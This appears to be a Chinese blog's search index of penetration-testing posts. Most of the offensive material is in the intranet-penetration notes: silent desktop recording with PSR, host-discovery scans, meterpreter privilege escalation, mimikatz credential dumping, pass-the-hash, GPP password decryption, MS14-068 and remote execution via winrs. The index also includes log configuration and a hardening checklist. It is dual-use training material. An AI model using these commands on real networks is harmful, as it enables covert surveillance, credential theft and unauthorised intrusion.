<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[巧妙利用win自带的 PSR 实现监控Windows桌面]]></title>
    <url>%2F2017%2F09%2F%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8win%E8%87%AA%E5%B8%A6%E7%9A%84-PSR-%E5%AE%9E%E7%8E%B0%E7%9B%91%E6%8E%A7Windows%E6%A1%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。 唯一的限制：要求系统是windows 7之后，也就是在做个人机的时候可以使用，不排除个别的情况。之前不知道有命令行的方法，直到看了三好学生的paper（这段时间一直在啃）。 进阶直接查看进阶只用方法。123456789101112131415161718psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;][/sketch (0|1)] [/slides (0|1)] [/gui (0|1)][/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)][/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]/start 开始录制，需要指定文件保存路径/stop 停止录制 /sc 捕捉记录步骤的截图，0|1/maxsc 最大的截图数量/maxlogsize 最大日志文件大小(MB)/gui 是否显示psr的界面，0|1 /arcetl Include raw ETW file in archive output./arcxml Include MHT file in archive output./recordpid Record all actions associated with given PID./sketch Sketch UI if no screenshot was saved./slides Create slide show HTML pages./output 保存的输出路径/stopevent Event to signal after output files are generated. 示例：123456psr.exe /start /gui 0 /output C:\windows\temp\capture.zip 后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zipStart-Sleep -s 10; 等待10s，即录制时间为10spsr.exe /stop; 结束录制，自动退出 压缩包内是mht格式,直接用IE打开就好。效果为： 防御 小结利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。 【参考】渗透技巧——如何巧妙利用PSR监控Windows桌面]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache2日志定制]]></title>
    <url>%2F2017%2F09%2Fapache2%E6%97%A5%E5%BF%97%E5%AE%9A%E5%88%B6%2F</url>
    <content type="text"><![CDATA[由于工作需要，需要对访问记录进行过滤，所以需要对日志生成的格式进行定制化。 认识日志格式制日志文件的格式涉及到两个指令，即LogFormat指令和CustomLog指令，默认httpd.conf文件提供了关于这两个指令的几个示例。12LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combinedLogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common 科普一下。 通用日志格式(Common Log Format)这是一个典型的记录格式：12LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; commonCustomLog logs/access_log common 它定义了一种特定的记录格式字符串，并给它起了个别名叫common ，其中的%指示服务器用某种信息替换，其他字符则不作替换。引号(“)必须加反斜杠转义，以避免被解释为字符串的结束。格式字符串还可以包含特殊的控制符，如换行符\n 、制表符\t。CustomLog指令建立一个使用指定别名的新日志文件，除非其文件名是以斜杠开头的绝对路径，否则其路径就是相对于ServerRoot的相对路径。 上述配置是一种被称为通用日志格式(CLF)的记录格式，它被许多不同的Web服务器所采用，并被许多日志分析程序所识别，它产生的记录形如：1127.0.0.1 - - [30/Aug/2017:10:01:57 +0800] &quot;GET /phpinfo.php HTTP/1.1&quot; 200 58518 部分说明如下：1234567127.0.0.1 (%h) #发送请求到服务器的客户的IP地址- (%l) #由客户端identd进程判断的RFC1413身份(identity)，输出中的符号&quot;-&quot;表示此处的信息无效。(不推荐使用)- (%u) #HTTP认证系统得到的访问该网页的客户标识(userid)，环境变量REMOTE_USER会被设为该值并提供给CGI脚本（一般为无意义项）[30/Aug/2017:10:01:57 +0800] (%t) #服务器完成请求处理时的时间 [日/月/年:时:分:秒 时区]\&quot;%r\&quot; #客户端发出的包含许多有用信息的请求行200 (%&gt;s) #服务器返回给客户端的状态码58518 (%b) #不包括相应头的字节数，如果想要设置记录为0，则设置为%B 组合日志格式(Combined Log Format) 另一种常用的记录格式是组合日志格式，形式如下：12LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-agent&#125;i\&quot;&quot; combinedCustomLog log/access_log combined 这种格式与通用日志格式类似，但是多了两个 \&quot;%{header}i\&quot; 项，其中的header可以是任何请求头。这种格式的记录形如：1192.168.2.101 - - [31/Aug/2017:14:32:39 +1200] &quot;GET /demo.php?dir=C%3A\\phpStudy\\WWW\\&amp;Submit=%E6%A3%80%E6%B5%8B HTTP/1.1&quot; 200 70971 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; 其中，多出来的项是：12(\&quot;%&#123;Referer&#125;i\&quot;) #因为我这里是本地做的测试，所以Referer信息没有显示。此项指明了该请求是被从哪个网页提交过来的，这个网页应该包含有/demo.php或者其连接。 &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; (\&quot;%&#123;User-agent&#125;i\&quot;) #&quot;User-Agent&quot;请求头。此项是客户端提供的浏览器识别信息。 定制日志格式首先从命令开始12可以简单地在配置文件中用多个CustomLog指令来建立多文件访问日志CustomLog log/demo/demo.log demo #文件夹提前建立 一般获取得信息只需要是远程访问主机IP(%h)，访问时间(%t)，请求行，状态码(%&gt;s)，浏览器信息(\”%{User-agent}i\”)而特殊的1234567891011121314只是记录404的状态， LogFormat %404&#123;Referer&#125;i BrokenLinks使用env SetEnvIfNoCase 当满足某个条件时，为变量赋值，一般结合其他指令使用。如： 1。SetEnvIf Request_URI &quot;/logo(.)+&quot; local_ref=0 Allow from env=local_ref 当local_ref有值时，可以访问。 2。SetEnvIfNoCase Request_URI .js$ useless-file CustomLog logs/demo/demo.log demo env=!useless-file 当满足条件时才记录日志。使用rotatelogs进行分隔 CustomLog &quot;|bin/rotatelogs.exe -l logs/demo/demo_%Y%m%d.log 86400&quot; demo 个人再windows下使用rotatelogs.exe会跳出一个窗口 弄了下，没看到想要的效果，有时间再更新下 筛选弄到最后，就想着用python直接提取需要的数据行就行。demo：123456789101112131415161718#-*- coding: UTF-8 -*- import sysdef readlog(keywords,outputfile,logpath): file = open(logpath,"r") filename = open(outputfile,"a") for dirr in file: if keywords in dirr: filename.write(dirr+"\n")if __name__ == '__main__': if len(sys.argv) &lt; 4: print('Usage:\n\t%s keywords outputfile logpath' % sys.argv[0]) else: keywords = sys.argv[1].strip() outputfile = sys.argv[2].strip() logpath = sys.argv[3].strip() readlog(keywords,outputfile,logpath) 当然，筛选的方法多种多样。 参考：Apache的日志文件Apache日志配置]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网存活扫描]]></title>
    <url>%2F2017%2F08%2F%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。 icmp扫描基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如cping。 在win下使用icmp扫描 cmd中执行如下命令，对整个C段进行ping扫描 1for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot; B 段查找 1for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i &quot;Pinging&quot; 另外findstr /i “pinging”或findstr /i “ping” 可以换成findstr “[” 的 可以适合多语言环境 利用powershell对目标内网进行icmp扫描123powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot; 目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254` 在linux下使用各类icmp扫描 最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可 12345678#!/bin/bashfor ip in 192.168.1.&#123;1..254&#125; do ping $ip -c 1 &amp;&gt; /dev/null if [ $? -eq 0 ];then echo $ip is alive .... fi done nmap的icmp扫描 1nmap -sn -PE 192.168.1.0/24 arp扫描在win下使用各种arp扫描123start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txtpowershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot; &gt;&gt; result.txt 在 linux 下使用 arp 扫描1234567891011# wget https://nmap.org/dist/nmap-7.40.tar.bz2# bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -# cd nmap-7.40 # ./configure 这里可以用--prefix指定安装路径# echo $?# make# make install# echo $?# make install# echo $? # nmap -sn -PR 192.168.1.0/24 尝试arp扫描 处在别人的vpn内网(kali) 123456789101112netdiscover -r 192.168.1.0/24 -i eth0msf的arp扫描模块msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf &gt; show optionsmsf &gt; set interface eth0msf &gt; set smac 00:0c:29:92:fd:85msf &gt; set rhosts 192.168.1.0/24msf &gt; set threads 20msf &gt; set shost 192.168.1.27msf &gt; run meterpreter 123meterpreter &gt; getsystem 另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题meterpreter &gt; run autoroute -s 192.168.1.0/24meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 基于smb和netbios的内网主机发现方式win下:1nbtscan.exe -m 192.168.1.0/24 非常经典的小工具 linux下:123456wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgztar -zxvf nbtscan-source-1.0.35.tgzmakeecho $?./nbtscan -h./nbtscan -m 192.168.1.0/24 域内扫描12net viewdsquery computer 其实,域内最好用的也就是nbtscan了 Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k %%j)))]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全,内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP可读可写操作]]></title>
    <url>%2F2017%2F07%2FPHP%E5%8F%AF%E8%AF%BB%E5%8F%AF%E5%86%99%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[判断文件是否为可读可写。 is_dir()函数属于Filesystem 函数,允许您访问和操作文件系统.is_dir()函数检查指定的文件是否是目录。 语法1is_dir(file) file为必选项，填写规定要检测的文件。如果 file 是一个相对路径，则按照当前工作目录检查其相对路径。注: 本函数的结果会被缓存。 opendir() 函数属于Directory 函数，opendir() 函数允许获得关于目录及其内容的信息。 语法1opendir(path,context); path为必选项，规定要打开的目录路径。context为可选项。 readdir() 函数属于Directory 函数，readdir() 函数返回目录中下一个文件的文件名。 语法1readdir(dir_handle); dir_handle为可选。当多个opendir()，则可指定之前由opendir() 打开的句柄资源。如果为指定，则使用最后一个由 opendir()打开的链接。 实例打开一个目录，读取它的内容，然后关闭：1234567891011&lt;?php$dir = "D:\phpStudy\WWW";if (is_dir($dir))&#123; //is_dir判断给定文件名是否是一个目录 if ($dh = opendir($dir))&#123; // 打开目录 while (($file = readdir($dh)) !== false)&#123; //循环读取指定目录内容 echo "filename:" . $file . "&lt;br&gt;"; &#125; closedir($dh);//关闭 &#125;&#125;?&gt; 结果： is_writable()和is_readable()属于Filesystem 函数,允许您访问和操作文件系统。is_writable() 函数判断指定的文件是否可写。is_readable() 函数判断指定文件名是否可读。 语法12is_writable(file)is_readable(file) file为必选项。规定要检查的文件。 实际应用中可以这样1234567891011121314151617181920212223242526272829303132333435363738&lt;form id="form1" name="form1" method="get" action=""&gt; &lt;label&gt; &lt;div align="center"&gt;文件路径： &lt;input name="dir" type="text" placeholder="自定义检测路径" /&gt; &lt;input type="submit" name="Submit" value="检测" /&gt; &lt;/div&gt; &lt;/label&gt;&lt;/form&gt;&lt;label&gt;&lt;div align="center"&gt;Author:&lt;span class="STYLE1"&gt;&lt;font color='red'&gt; RcoIl&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;&lt;?phpheader("content-Type: text/html; charset=utf-8");function listDir($dir)&#123; //定义listDir方法 if(is_dir($dir))&#123; // is_dir判断给定文件名是否是一个目录 if ($dh = opendir($dir)) &#123; // 打开目录 while (($file= readdir($dh)) !== false)&#123; //如果不为false，则循环读取指定目录列表 if((is_dir($dir."/".$file)) &amp;&amp; $file!="." &amp;&amp; $file!="..")&#123; // 去掉此行显示的是所有的非目录文件；"."表示当前目录；".."表示上级目录； if(is_writable($dir."/".$file)&amp;&amp;is_readable($dir."/".$file))&#123; //判断文件夹是否可写可读 echo "&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;".$dir.$file."&lt;font color='red'&gt; 可写&lt;/font&gt;&lt;font color='Blue'&gt; 可读&lt;/font&gt;"."&lt;br&gt;&lt;hr&gt;"; &#125;else&#123; if(is_writable($dir."/".$file))&#123; echo "&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;".$dir.$file."&lt;font color='red'&gt; 可写&lt;/font&gt;"."&lt;br&gt;&lt;hr&gt;"; &#125;else&#123; echo "&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;".$dir.$file."&lt;font color='red'&gt; 可读&lt;/font&gt;&lt;font color='Blue'&gt; 不可写&lt;/font&gt;"."&lt;br&gt;&lt;hr&gt;"; &#125; &#125; listDir($dir."/".$file."/"); &#125; &#125; &#125;closedir($dh); &#125; &#125;//起头运行if(isset($_GET['dir']))//检索&#123;listDir($_GET['dir']);&#125;?&gt; 当然，这代码肯定不是原创的。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全鸡儿环境]]></title>
    <url>%2F2017%2F07%2F%E5%AE%89%E5%85%A8%E9%B8%A1%E5%84%BF%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[在平时的工作生活中，如果打造一个相对安全的环境 以下如无特殊说明，均为windows 7环境 个人电脑时间同步通常为了得到更加精确的时间信息，我们会采用将Windows时间与网络时间进行同步操作来实现。但是如果在被反日的过程中发现使用了时间同步功能，那基本就可以确定所在地区，所以为了更友好，就需要关闭这项功能。 点击桌面右下角时间，然后在弹出的窗口中点击“更改日期和时间设置” 在出现的窗口上部的选项选择“Internet时间” 接下来选择“更改设置” 在“与 Internet 时间同步”的勾勾消，再点击“确定”就行了。 win7关闭同步中心 “开始”-“运行”-“regedit” 在“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Syncmgr\Handlers”项中找到一个与SQL Server 2000相关的分支 删除它，这时任务栏里的同步中心图标应该会消失，重启以后同步中心也不会自动启动了。 当然，如果你有其它同步项，比如没有禁用离线文件，或者有移动设备同步，都有可能使同步中心自动启动。 update大多数朋友可能会遇上WIN7系统关机时出现自动更新延长关机时间，导致有急事无法快速关机拔电源。但要说的不是这回事，都懂得。同时调出本地组策略编辑器 Win和R键,调出命令提示符 输入gpedit.msc 找到管理模板/Windows组件 找到Windows Update，开启那啥。 打印机 在控制面板中的管理工具中找到服务 在其中找到Print Spooler 将服务停掉也可以直接在命令行下执行net stop spooler 摄像头最保险的办法的就是直接禁用摄像头的驱动了。 右击电脑桌面上的“计算机”图标选择“属性”选项; 设备管理器 图像设备，找到我们笔记本内置的摄像头 直接右击禁用即可 麦克风关闭方法： 首先在电脑桌面右下角任务栏上的声音图标上右键，然后选择“录音设备”。 之后在弹出的声音属性对话框，将鼠标放在“麦克风”上右键选择“禁用”即可（或点击属性进行选择）。 这样我们就简单禁用了录音设备麦克风了，不影响声卡，依然可以正常播放音乐，只是不能再录音以及语音说话了。 USB自动读取禁止usb设备的自动运行，首先是出于安全考虑，再者按需运行，减少不必要的程序开启。 小娜（windows 10）使用毛豆就可以。 个人意识安全上网不在工作机上登陆私人账户 密码分级很多人各网站用户名密码相同，这样黑客用被泄露网站的密码登录其他网站很有可能会成功，每个网站都设置不同的密码可能不现实，那就可以对密码就行分级管理。 文件删除如果是平时的删除则使用强制删除，Shift+del。电脑出售或者移交其他人使用，删除敏感文件后，同样需要对硬盘脱密，使用脱密工具反复擦写5次以上。 文件加密存储windows的话本身的BitLocker就很不错。个人使用TrueCrypt，文件直接放在硬盘上，电脑丢失后硬盘上文件就可以被直接读取，如果存到加密盘中，拿到硬盘后必须输入加密盘密码加载加密盘才能看到其中的文件，就有效避免了重要文件泄密。 软件下载最好是到该软件官网下载，校验MD5值，避免出现捆马现象。校验方法：1certutil -hashfile 文件名 MD5 数据备份 个人电脑上的重要数据要定期备份到服务器或移动硬盘 备份时注意数据要加密，建议使用加密盘，备份整个加密盘原始文件 邮箱工作邮箱文件及时删除（前提是备份好文件） 桌面安全同事之间工作内容、工作性质不同，有权知晓的信息内容、信息密级也有所不同。离开电脑时记得锁屏，快捷键为Win+L桌面文件不可以存在敏感文件，敏感文件需要放在加密盘 网络物理机脱网，虚拟机使用桥接模式，加密盘放在物理机内，整盘加密或者部分文件加密都是选择对象。文本文件处理都在隔断网络的物理机上，毕竟各种钓鱼。 WIFI安全只能说，不是自己的WIFI就不要连接，毕竟、毕竟、毕竟只要WIFI名字相同就能随意连接的年代，有点慌。建议： 日常不用WIFI时关闭手机和笔记本的无线局域网功能，以防止自动连接恶意WIFI 当手机或笔记本连接上WIFI后，留意连接到的WIFI热点名称 强制通过VPN上网,VPN断线就断网部分工作机是需要这样的机制，至于为什么，嗯。 https://www.t00ls.net/thread-38739-1-1.htmlhttps://www.t00ls.net/viewthread.php?tid=38860&amp;extra=&amp;page=1 待续…]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透（持续更新）]]></title>
    <url>%2F2017%2F06%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。标：本文多数内容是整合的知识点。 前期基本信息探测尽可能详细得分析出网段信息、各部门ip段、重点找出IT运维部、OA、邮箱服务器、人力资源管理等。最后画一张组织结构图，这样在内网定位的时候，无论是针对内网查找资料还是针对特殊任务都是非常实用的一项技术。不过信息收集，不是一天两天就能完成的事情，这种事情要持之以恒。 人事组织结构图demo: 思路：这种人事图，除了在外部站点上有，也可以到首页去查找关于我们，有一些简单的说明，然后再去招聘网找各式的岗位名称，最后连蒙带猜（没有这样的操作），收集尽量精确能到各个人员。当然，想要详细，就得通过不同的渠道获取。 ip分布思路： 一般大公司有内部门户系统，可通过内部门户系统公开链接找出部门ip段（如果找到路由也很惊喜） 内网中可通过路由器、交换机等设备命令执行、snmp、弱口令获取网络拓扑 切入点（起点） Web门户系统getshell—-&gt;system权限； 邮件服务器； 邮件服务器获取信息中得出VPN账密和IP地址； 路由器建立VPN进入； 待更新… 靶机信息收集主要针对三种： 基于命令形式的，包括权限信息，机器信息，进程端口，网络连接，共享、会话等等； 基于应用与文件形式的，例如一些敏感文件，密码文件，浏览器，远程连接客户端等； 还有一种是最直接的，例如抓取本地明文与hash，键盘记录，屏幕记录等。 网上已经有大量相关的资源与文章了，这里就不再占篇幅了，只说点额外的不常见技巧。 命令行形式包括但不限于一下几点 常用命令123456789101112hostname #主机名systeminfo #系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）set #环境变量net user #查看默认用户net view #显示当前域或工作组中计算机的列表net localgroup #查看用户组net localgroup Administrators #查看Administrators组所有用户(包括隐藏用户)query user #查看当前会话（window7 64以上）tasklist /v #显示当前进程和进程用户net config workstation #查看当前登陆用户信息net statistics workstation #查看主机开机时间net share #查看共享文件夹 不常用命令12345678910whoami /all 查看Mandatory Label看我们是否过uacnet session 查看有没有远程连过来的sessioncmdkey /l 看是否保存了登陆凭证.（凭据管理器）echo %logonserver% 查看登陆域net stitastics server 查看登陆时间Wmic 能让攻击者大量利用来获取系统信息的系统自带工具 wmic qfe list #获取补丁信息Netsh 做端口转发spn –l administrator 域内查某个用户spn记录dsquery | nltest 域内信息收集 应用与文件形式虽然标题不错，但是内容只是去翻文件，包括一些应用的配置文件，密码文件等。有时候会碰到一些加密的office办公软件，例如word,excel 这些。 如果是低版本如2003的话，攻击者会在百度搜一些网上的破解软件进行破解（会联网）。如果是高版本的话，往往在目标用户开着文件时使用微软SysinternalsSuite套装中的procdump将内存dump回去，用内存查看器直接查看文件内容。 因此就算有些敏感文件加密了照样能够被攻击者获取敏感信息。 hash和明文这一步使用mimikatz基本就足够了，也分exe、dll与ps三个版本，攻击者会分情况使用。屏幕截图在windows中也有系统自带psr命令能够做截图等等（但是只有windows7以上才会有）。低版本的可以使用nircmd，使用为：nircmdc.exe savescreenshot 1.png。 网络环境的判断 机器所处位置区域的判断; 机器角色的判断; 进出口流量是否连通的判断，是否出的去，进的来。 位置的判断位置判断是指机器处于网络拓扑中的某个区域，是在DMZ区，办公网，还是核心区，核心DB等多个位置，当然这里的区域并不是绝对的，只是大概的一个环境，不同的地方网络环境不一样，区域的界限也不一定明显。 角色的判断机器角色的判断指判断已经控制的机器是普通Web服务器、开发测试服务器、公共服务器、文件服务器还是代理服务器、DNS服务器、存储服务器等等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况进行综合判断的。 连通性的判断出口流量是否连通的判断指机器是否能上外网这些，要综合判断协议（tcp\http\dns\icmp等协议）与端口(常见能出去的端口有80,8080,443,53,110,123等)。在这里还有一种是网络内网设置了代理服务器的情况，攻击者通常会查看环境变量set，主机名是否有proxy字样的机器，注册表是否有写明代理地址或指定pac代理文件等。 横向渗透如果是workgroup横向，攻击者会尝试web漏洞挖掘、密码猜解等。如果是domain横向，方法就比较多了，例如AD2008 gpp 、ms14-068 、kerberoast 、配置错误、一直抓密码等。 代理转发渗透测试-之-代理篇 默认权限配置1234567[+]普通机器允许Console：administrator组（domain admins），users组（domain users），backup operators组允许rdp：administrator组（domain admins），Remote desktop users组[+]域控AD允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组允许rdp：administrator组，Remote desktop users组 如果出现配置错误，那就是权限配置问题。 tips：当某些普通\不普通用户加入AD的rdp组或其他管理员组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。 远程命令执行方式例如at\schtasks\psexec\wmic\sc\ps网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫5985，原理跟大家常说的powershell remote是一样的，基于winrm服务，于是可以这样执行。又是一个系统自带的远程管理工具。1winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig 域管理员定位一是日志，二是会话。日志指的的本地机器的管理员日志。可以使用脚本或wevtutil导出查看会话是域内每个机器的登陆会话，可以匿名查询，无需权限。可以使用netsess.exe或powerview查询1PS C:\Users\RcoIl&gt; get-netsession -computername &quot;192.168.1.100&quot; 域内信息探测常用命令123456789net user /domain #查看域用户net view /domain #查看有几个域net view /domain:XXX #查看此域内电脑net group /domain #查询域里面的组net group “domain computers” /domain #查看加入到域内的所有计算机名net group “domain admins” /domain #查看域管理员net group “domain controllers” /domain #查看域控制器net user hacker /domain #获得指定账户的详细信息net accounts /domain #获得域密码策略设置，密码长短，错误锁定等信息 dsquery 命令 查询 AD1234567891011dsquery computer - 查找目录中的计算机。dsquery contact - 查找目录中的联系人。dsquery subnet - 查找目录中的子网。dsquery group - 查找目录中的组。dsquery ou - 查找目录中的组织单位。dsquery site - 查找目录中的站点。dsquery server - 查找目录中的 AD DC/LDS 实例。dsquery user - 查找目录中的用户。dsquery quota - 查找目录中的配额规定。dsquery partition - 查找目录中的分区。dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象。 Net系列命令获取域内信息123456789Csvde/ldifde/dsquery/adfind/ldapsearch #探测更详细信息使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）Nslookup -type=SRV_ldap._tcp #(寻找域控)tasklist /v #列出进程和进程所有者（看是否有域管登陆）PowerView #（powershell脚本 辅助找寻定位关键用户）WinScanX.exe #远程信息刺探Winfo.exe #遍历远程用户名nmap smb-enum-sessions.nse #（引擎来获取远程机器的登陆session，并且不需要管理权。）netview.exe`#(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户) linux cat /etc/nsswitch看看密码登陆策略，我可以看到使用了file ldap模式 less /etc/ldap.confbase ou=People,dc=unix-center,dc=net找到ou,dc,dc设置 查找10条用户记录ldapsearch -h 192.168.2.2 -x -z 10 -p指定端口 查看NFS连接showmount -e ip 查找管理员信息匿名方式1ldapsearch -x -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 有密码形式1ldapsearch -x -W -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 获取域管权限账户枚举（nbtstat -A\nmapd等）、hash注入 （mimikatz） 、bypassuac、 session切换等 组策略漏洞（GPP）域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在SYSVOL目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开得AES密钥破解密码。 MS14-068 KERBEROS漏洞Benjamin Delpy(Mimikatz的作者)写了一个MS14-068的利用工具，叫Kekeo,是PyKEX的升级版。它能够找到并定位有漏洞的域控，在打了补丁和有2012/2012R2域控得情况下仍能凑效。 MS17-01017年是个好年。 相同密码登陆如果内网主机的本地管理员账户密码相同且允许本地账户登陆域内其他机器，那么可以通过以获取的hash或明文 一般步骤： 远程登陆到任意一台主机； 获取一台域控主机的权限； Dump内存获得hash（或明文）； 通过pass the hash 或 明文 尝试登陆其他主机； 继续搜集hash 或明文 并尝试远程登陆； 直到获得域管理员账户hash，登陆域控，最终成功控制整个域 域登陆缓存mscash使用reg命令提取sam、system、security、然后用creddump7提取mscash。 利用漏洞配置不当获取更多主机权限 常见应用漏洞：struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion 常见语言反序列化漏洞php、Java、python、ruby、node.js 数据库漏洞及配置不当mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当 内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…） web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql...） 系统备份文件（ghost）中读密码 在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe ms08-067远程溢出（极少能碰到） cmdkey /list 远程终端可信任连接连接netpass.exe读取该密码 arp欺骗中间人攻击（替换sql数据包、认证凭证获取、密码获取极大不到万不得已不会用） WPAD中间人攻击（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py）） 翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站） 用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学） 定向浏览器信息ip信息定向挂马（0day） 用以收集的密码（组合变换密码）对各服务进行爆破 应用0day攻击… 做MIMT这块的两个工具12responder.py &amp;&amp;Invoke-Inveigh.ps1 ，经常被用来做信息收集。responder.py –A 分析模式 Powerview.ps1 域渗透利器最后，如果攻击者终于拿到了域控了，要做的事就是信息获取，包括全域hash（mimikatz），ldap信息(csvde)，dns信息（dnscmd）等，碰到文件占用的情况还会使用卷影复制。 除此之外攻击者还可能利用域控干点其他事，例如当问权限设置严格，攻击者所在位置访问不了目标机器，甚至域控本机也访问不了，只能是目标单向访问的情况，例如攻击者找不到目标ip，这时攻击者就可以拿出域组策略GPO这个大杀器了，当然相对应的动静会偏大。 